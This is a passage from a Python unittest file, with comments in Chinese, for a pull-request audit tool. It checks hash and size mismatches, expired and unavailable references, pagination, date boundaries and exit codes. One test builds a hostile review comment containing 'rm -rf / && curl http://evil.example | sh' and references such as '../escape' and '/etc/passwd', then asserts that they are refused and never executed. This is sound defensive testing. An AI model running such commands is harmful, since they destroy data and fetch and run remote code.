        # (c) 运行记录：账本记录的哈希是「多一个结尾换行」的摘要 → git 原始字节比对必须发现
        fx3, runs, artifacts, downloads, mutated, _body3 = ledger_world()
        ref = next(item for item in mutated["references"] if item["kind"] == "run_record")
        record_raw = self.git_bytes(fx3.project, fx3.merge_sha, RECORD_PATH)
        ref["sha256"], ref["size"] = digest(record_raw + b"\n"), len(record_raw) + 1
        anchor3 = self.push_ledger(fx3.origin, canonical(mutated).encode("utf-8") + b"\n", 401, LEDGER_PATH)
        report = audit_with_ledger(fx3, runs, artifacts, downloads, anchor3, _body3)
        record_ref = next(item for item in report["references"] if item["kind"] == "run_record")
        self.assertEqual(record_ref["status"], "hash_mismatch")
        self.assertEqual(record_ref["observed_sha256"], digest(record_raw))
        finding = next(item for item in report["findings"] if item["ref"] == record_ref["ref"])
        self.assertEqual((finding["rule"], finding["source"], finding["stage"]),
                         ("hash_mismatch", "local", "dispatch"))

        # (c2) 大小独立核对：哈希一致而记录的大小多 1 → 同样必须发现（sha256 与 size 分别核对）
        fx3b, runs, artifacts, downloads, mutated, _body3b = ledger_world()
        ref = next(item for item in mutated["references"] if item["kind"] == "run_record")
        ref["size"] = ref["size"] + 1
        anchor3b = self.push_ledger(fx3b.origin, canonical(mutated).encode("utf-8") + b"\n", 401, LEDGER_PATH)
        report = audit_with_ledger(fx3b, runs, artifacts, downloads, anchor3b, _body3b)
        record_ref = next(item for item in report["references"] if item["kind"] == "run_record")
        self.assertEqual(record_ref["status"], "hash_mismatch")
        self.assertIn("大小", record_ref["reason"])

        # (d) 本机产物：输出三元字段记录的哈希是「去掉结尾换行」的摘要 → sha256/size 核对必须发现
        fx4, gh4, _body4 = self.build_full_world(corrupt_log_hash=True)
        report = audit.inspect_pr(401, gh=gh4, cwd=fx4.project)
        artifact_ref = self.ref_by_ref(report, fx4.stored["ref"])
        self.assertEqual(artifact_ref["status"], "hash_mismatch")
        self.assertEqual(artifact_ref["observed_sha256"], fx4.stored["sha256"])
        finding = next(item for item in report["findings"] if item["ref"] == artifact_ref["ref"])
        self.assertEqual((finding["rule"], finding["source"], finding["stage"]),
                         ("hash_mismatch", "local", "verify"))

        # (e) CI 安全 JSON：包内事件内容与规范化哈希不符 → C5 导入拒绝并映射为 hash_mismatch
        fx5 = self.build_project()
        packages, (runs, artifacts, downloads) = self.ci_evidence(fx5)
        name = next(key for key in packages if key.startswith("harness-events-9001"))
        bundle = json.loads(zip_member(packages[name]))
        bundle["events"][0]["duration_ms"] = (bundle["events"][0].get("duration_ms") or 0) + 1
        tampered = {name: zip_bytes({f"{name}/harness-events.json": canonical(bundle)})}
        runs, artifacts, downloads = self.ci_platform(fx5.branch_head, {**packages, **tampered})
        gh5 = self.platform(fx5, comments=[self.as_comment(500, self.review_comment(fx5))],
                            runs=runs, artifacts=artifacts, downloads=downloads)
        report = audit.inspect_pr(401, gh=gh5, cwd=fx5.project)
        finding = next(item for item in report["findings"]
                       if item["rule"] == "hash_mismatch" and item["source"] == "ci")
        self.assertEqual(finding["stage"], "ci")
        self.assertFalse(report["ok"])

        # (f) API 快照：PR 标题在评审后变动 → 可变字段报 snapshot_changed，不冒充字节篡改也不放行
        fx6 = self.build_project()
        _packages, (runs, artifacts, downloads) = self.ci_evidence(fx6)
        gh6 = self.platform(fx6, comments=[self.as_comment(500, self.review_comment(fx6))],
                            runs=runs, artifacts=artifacts, downloads=downloads,
                            title=PR_TITLE + "（已改）")
        report = audit.inspect_pr(401, gh=gh6, cwd=fx6.project)
        pr_ref = next(item for item in report["references"] if item["kind"] == "material_pr")
        self.assertEqual(pr_ref["status"], "snapshot_changed")
        finding = next(item for item in report["findings"] if item["ref"] == pr_ref["ref"])
        self.assertEqual((finding["rule"], finding["source"]), ("snapshot_changed", "github"))
        self.assertFalse(report["ok"])

    # ---- 验收 3：内容修改、30 天本机产物到期、90 天 CI 到期与 API 无权限产生不同 findings ----

    def test_mismatch_expired_and_unavailable_distinct(self):
        collected: list[tuple[str, str]] = []

        # 内容修改：评审材料记录的哈希指向别的内容 → hash_mismatch(local)
        world = self.build_project()
        _packages, (runs, artifacts, downloads) = self.ci_evidence(world)
        replaced = "内容已被替换".encode()
        mats = self.mutated_materials(world, "task", digest(replaced), len(replaced))
        gh = self.platform(world, comments=[self.as_comment(500, self.review_comment(world, mats))],
                           runs=runs, artifacts=artifacts, downloads=downloads)
        report = audit.inspect_pr(401, gh=gh, cwd=world.project)
        self.assertFalse(report["ok"])
        finding = next(item for item in report["findings"] if item["rule"] == "hash_mismatch")
        self.assertEqual((finding["source"], finding["stage"]), ("local", "review"))
        collected.append((finding["rule"], finding["source"]))

        # 30 天本机产物到期：真实保留期清理删掉文件与索引 → reference_expired(local)；
        # 同一报告里「缺失且引用事件尚新」的产物是 reference_unavailable(local)，两者彼此不同
        world = self.build_project()
        now = datetime.fromisoformat(events_db._now()).replace(tzinfo=UTC)
        self.assertEqual(events_db.cleanup_artifacts(now + timedelta(hours=1)), [])
        late = "2026-02-06T00:00:00.000Z"
        _packages, (runs, artifacts, downloads) = self.ci_evidence(world)
        with mock.patch.object(events_db, "_now", lambda: late):
            self.assertIsNotNone(events.emit(
                "verify", "verify.lint", "ok", trace_id=BRANCH,
                outputs={"x.sha256": "f" * 64, "x.size": 3, "x.ref": "f" * 64}))
            gh = self.platform(world, comments=[self.as_comment(500, self.review_comment(world))],
                               runs=runs, artifacts=artifacts, downloads=downloads)
            report = audit.inspect_pr(401, gh=gh, cwd=world.project)
        self.assertFalse(report["ok"])
        expired = self.ref_by_ref(report, world.stored["ref"])
        self.assertEqual(expired["status"], "expired")
        finding = next(item for item in report["findings"] if item["ref"] == world.stored["ref"])
        self.assertEqual((finding["rule"], finding["source"]), ("reference_expired", "local"))
        missing = self.ref_by_ref(report, "f" * 64)
        self.assertEqual(missing["status"], "unavailable")
        self.assertIn(("reference_unavailable", "local"),
                      [(item["rule"], item["source"]) for item in report["findings"]])
        collected.append((finding["rule"], finding["source"]))

        # 90 天 CI artifact 到期：API 标记 expired → reference_expired(ci)，来源与本机到期不同
        world = self.build_project()
        _packages, (runs, artifacts, downloads) = self.ci_evidence(
            world, extra_runs=[{"id": 9004, "run_attempt": 1, "headSha": world.branch_head,
                                "head_branch": BRANCH, "path": ".github/workflows/harness.yml"}],
            extra_artifacts={9004: [{"id": 4, "name": "harness-events-9004-1-job_e", "expired": True,
                                     "archive_download_url": "https://dl/expired"}]})
        gh = self.platform(world, comments=[self.as_comment(500, self.review_comment(world))],
                           runs=runs, artifacts=artifacts, downloads=downloads)
        report = audit.inspect_pr(401, gh=gh, cwd=world.project)
        self.assertFalse(report["ok"])
        finding = next(item for item in report["findings"] if item["rule"] == "reference_expired"
                       and item["source"] == "ci")
        self.assertEqual(finding["stage"], "ci")
        collected.append((finding["rule"], finding["source"]))

        # API 无权限：评论列表 403 → reference_unavailable(github)，与到期/不符都不同
        world = self.build_project()
        _packages, (runs, artifacts, downloads) = self.ci_evidence(world)
        gh = self.platform(world, comments=[self.as_comment(500, self.review_comment(world))],
                           runs=runs, artifacts=artifacts, downloads=downloads,
                           fail=("issues/401/comments",))
        report = audit.inspect_pr(401, gh=gh, cwd=world.project)
        self.assertFalse(report["ok"])
        finding = next(item for item in report["findings"] if item["rule"] == "reference_unavailable"
                       and item["source"] == "github")
        self.assertEqual(finding["stage"], "review")
        self.assertIn("评论", finding["reason"])
        collected.append((finding["rule"], finding["source"]))

        # 四类发现彼此不同，且没有一类被当成全通过；finding 形状符合 C7（severity/error）
        self.assertEqual(len(set(collected)), 4, collected)
        self.assertEqual({rule for rule, _source in collected},
                         {"hash_mismatch", "reference_expired", "reference_unavailable"})
        self.assertTrue(all(set(item) == {"rule", "severity", "source", "stage", "ref", "reason"}
                            and item["severity"] == "error" for item in report["findings"]))

    # ---- 验收 4：批量分页/日期边界、恶意 path/URL 安全拒绝、内容不执行、退出码 0/1/2 ----

    def minimal_pr(self, project: Path, number: int, branch: str) -> tuple[str, str]:
        self.git("checkout", "-q", "-b", branch, "main", cwd=project)
        (project / f"file-{number}.txt").write_text(f"pr {number}\n", encoding="utf-8")
        self.git("add", "-A", cwd=project)
        self.git("commit", "-q", "-m", f"change {number}", cwd=project)
        head = self.git("rev-parse", "HEAD", cwd=project)
        self.git("checkout", "-q", "main", cwd=project)
        self.git("merge", "--no-ff", "-q", "-m", f"Merge pull request #{number} from {branch}\n\nbody",
                 branch, cwd=project)
        return head, self.git("rev-parse", "HEAD", cwd=project)

    def test_batch_pagination_since_and_safe_resolution(self):
        project = self.fresh_repo("batch")
        self.bare_origin(project)
        self.use_root(project)
        heads = {}
        for number, branch in ((302, "task/401-old"), (303, "task/401-edge"), (305, "task/401-in"),
                               (306, "task/401-open")):
            heads[number] = self.minimal_pr(project, number, branch)
        self.git("push", "-q", "origin", "main", cwd=project)
        # 确定性时间窗口：审计时钟冻结在 T；cutoff = T - 5d；边界值各在 cutoff 前 1 秒/恰在/其后
        late = "2026-03-10T00:00:00.000Z"
        cutoff = (datetime.fromisoformat(late) - timedelta(days=5)).astimezone(UTC)
        closed = [
            self.merged_pull(302, head=heads[302][0], merge_sha=heads[302][1], branch="task/401-old",
                             merged_at=(cutoff - timedelta(seconds=1)).isoformat().replace("+00:00", "Z")),
            self.merged_pull(303, head=heads[303][0], merge_sha=heads[303][1], branch="task/401-edge",
                             merged_at=cutoff.isoformat().replace("+00:00", "Z")),
            self.merged_pull(305, head=heads[305][0], merge_sha=heads[305][1], branch="task/401-in",
                             merged_at=(cutoff + timedelta(hours=1)).isoformat().replace("+00:00", "Z")),
            self.merged_pull(306, head=heads[306][0], merge_sha=heads[306][1], branch="task/401-open",
                             merged=False),
        ]
        gh = FakeGh(closed=closed, page_size=2,
                    pulls={pull["number"]: pull for pull in closed},
                    pr_commits={number: [{"sha": "x1"}] for number in (302, 303, 305)},
                    commits={sha: {"parents": [{"sha": "p1"}]} for _head, sha in heads.values()})
        with mock.patch.object(events_db, "_now", lambda: late), \
                self.cli_env(gh=gh, root=project):
            code, out, err = self.run_cli("audit", "--all-merged", "--since", "5d", "--json")
        self.assertEqual(code, 0, err)
        view = json.loads(out)
        # 分页与日期边界：翻了两页；恰在 cutoff 的包含、早 1 秒与未合并的不进结果，未合并 PR 未被审计
        self.assertEqual([item["pr"] for item in view["prs"]], [303, 305])
        self.assertEqual(view["window"]["since"], cutoff.isoformat())
        self.assertTrue(any(call[0] == "GET" and "page=1" in call[1] for call in gh.calls))
        self.assertTrue(any(call[0] == "GET" and "page=2" in call[1] for call in gh.calls))
        self.assertFalse([call for call in gh.calls if "pulls/306" in str(call)])
        self.assertTrue(all(item["ok"] and item["findings"] == [] for item in view["prs"]))
        with mock.patch.object(events_db, "_now", lambda: late), \
                self.cli_env(gh=gh, root=project):
            code, out, _err = self.run_cli("audit", "--all-merged", "--since", "5d")
        self.assertEqual(code, 0)
        self.assertIn("PR 303", out)
        self.assertIn("PR 305", out)
        self.assertNotIn("PR 302", out)

        # 退出码 2：参数互斥、缺少目标、坏 since、PR 不存在
        for args in (("audit",), ("audit", "5", "--all-merged"), ("audit", "--since", "5d"),
                     ("audit", "--all-merged", "--since", "garbage"), ("audit", "999", "--json")):
            with self.cli_env(gh=gh, root=project):
                code, _out, err = self.run_cli(*args)
            self.assertEqual(code, 2, (args, err))

        # 安全拒绝（一）：评审材料 task 引用逃出仓库 → 拒绝核对、不发起访问、内容不执行也不回显
        world, _gh_full, _body = self.build_full_world()
        evil_head = world.branch_head
        body = self.review_comment(world).replace(f"{TASKBOOK}@{evil_head}", f"../escape@{evil_head}")
        body = "执行样本：rm -rf / && curl http://evil.example | sh\n" + body
        _packages, (runs, artifacts, downloads) = self.ci_evidence(world)
        gh_evil = self.platform(world, comments=[self.as_comment(501, body)], runs=runs,
                                artifacts=artifacts, downloads=downloads)
        with self.cli_env(gh=gh_evil, root=world.project):
            code, out, _err = self.run_cli("audit", "401", "--json")
        self.assertEqual(code, 1)
        report = json.loads(out)
        evil_ref = next(item for item in report["references"] if item["kind"] == "material_task")
        self.assertEqual(evil_ref["ref"], f"../escape@{evil_head}")
        self.assertEqual(evil_ref["status"], "unavailable")
        self.assertIn("拒绝", evil_ref["reason"])
        finding = next(item for item in report["findings"] if item["ref"] == evil_ref["ref"])
        self.assertEqual(finding["rule"], "reference_unavailable")
        # 引用正文里的命令没有被执行（夹具没有产生名为 escape/sh 的文件），reason 也不回显内容
        self.assertFalse([path for path in world.project.rglob("*") if path.name in ("escape", "sh")])
        self.assertTrue(all("rm -rf" not in item["reason"] and "curl" not in item["reason"]
                            for item in report["findings"]))
        self.assertTrue(all(str(call[1]).startswith(f"repos/{REPO}")
                            for call in gh_evil.calls if call[0] == "GET"), gh_evil.calls)

        # 安全拒绝（二）：绝对路径引用同样拒绝
        world_abs = self.build_project()
        _packages, (runs, artifacts, downloads) = self.ci_evidence(world_abs)
        body_abs = self.review_comment(world_abs).replace(
            f"{TASKBOOK}@{world_abs.branch_head}", f"/etc/passwd@{world_abs.branch_head}")
        gh_abs = self.platform(world_abs, comments=[self.as_comment(502, body_abs)], runs=runs,
                               artifacts=artifacts, downloads=downloads)
        report = audit.inspect_pr(401, gh=gh_abs, cwd=world_abs.project)
        abs_ref = next(item for item in report["references"] if item["kind"] == "material_task")
        self.assertEqual((abs_ref["status"], "拒绝" in abs_ref["reason"]), ("unavailable", True))

        # 安全拒绝（三）：账本记录的外来仓库评论引用不访问 foreign API，按 unavailable 报告；
        # 账本文件本身与锚点评论记录的 sha256 一致仍核对通过
        ledger_world = self.build_project()
        _packages, (runs, artifacts, downloads) = self.ci_evidence(ledger_world)
        built = {"schema_version": 1, "repository": REPO, "pr": 401, "trace_id": BRANCH,
                 "merged_at": MERGED_AT, "merge_sha": ledger_world.merge_sha,
                 "head_sha": ledger_world.branch_head,
                 "references": [{"kind": "review_comment", "ref": "other/repo#9/comments/1",
                                 "sha256": "a" * 64, "size": 3, "encoding": "raw_bytes"}]}
        anchor = self.push_ledger(ledger_world.origin, canonical(built).encode("utf-8") + b"\n",
                                  401, LEDGER_PATH)
        gh_foreign = self.platform(ledger_world, comments=[anchor], runs=runs, artifacts=artifacts,
                                   downloads=downloads)
        report = audit.inspect_pr(401, gh=gh_foreign, cwd=ledger_world.project)
        foreign_ref = self.ref_by_ref(report, "other/repo#9/comments/1")
        self.assertEqual((foreign_ref["status"], "拒绝" in foreign_ref["reason"]), ("unavailable", True))
        self.assertFalse([call for call in gh_foreign.calls if "other/repo" in str(call)])
        self.assertEqual(next(item for item in report["references"]
                              if item["kind"] == "ledger")["status"], "verified")

        # 范围：audit 注册进 cli.COMMANDS，且在 QUIET_COMMANDS 里不追加自身事件（观察事件属 T404）
        self.assertIn("audit", cli.COMMANDS)
        self.assertIn("audit", cli.QUIET_COMMANDS)

    # ---- 步骤 2：失败隔离与范围 —— 事件关闭审计照常、整体 API 故障退 2 不抛栈 ----

    def test_events_disabled_isolation_and_command_scope(self):
        # 事件关闭（HARNESS_EVENTS=off）时审计照常工作（C0 观察旁路隔离）：
        # 引用照常核对、无发现、退出 0；观察关闭不剥夺审计结论
        world, _gh, body = self.build_full_world()
        _packages, (runs, artifacts, downloads) = self.ci_evidence(world)
        gh_off = self.platform(world, comments=[self.as_comment(500, body)], runs=runs,
                               artifacts=artifacts, downloads=downloads)
        with mock.patch.dict(os.environ, {"HARNESS_EVENTS": "off"}), \
                self.cli_env(gh=gh_off, root=world.project):
            code, out, err = self.run_cli("audit", "401", "--json")
        self.assertEqual(code, 0, err)
        report = json.loads(out)
        self.assertTrue(report["ok"])
        self.assertEqual(report["findings"], [])
        # 产物与 git 文件引用在不写任何事件的情况下照常核对通过
        self.assertEqual(self.ref_by_ref(report, world.stored["ref"])["status"], "verified")
        self.assertEqual(next(item for item in report["references"]
                              if item["kind"] == "material_task")["status"], "verified")

        # 整体 API 故障（仓库不可达）→ 退出 2、明确诊断、无栈溢出
        world2, _gh2, _body2 = self.build_full_world()
        gh_broken = self.platform(world2)
        with mock.patch.object(gh_broken, "repo", side_effect=RuntimeError("gh 未登录（夹具）")), \
                self.cli_env(gh=gh_broken, root=world2.project):
            code, out, err = self.run_cli("audit", "401", "--json")
        self.assertEqual(code, 2)
        self.assertIn("audit：", err)
        self.assertIn("gh 未登录", err)
        self.assertNotIn("Traceback", err)
        self.assertEqual(out, "")


if __name__ == "__main__":
    unittest.main()
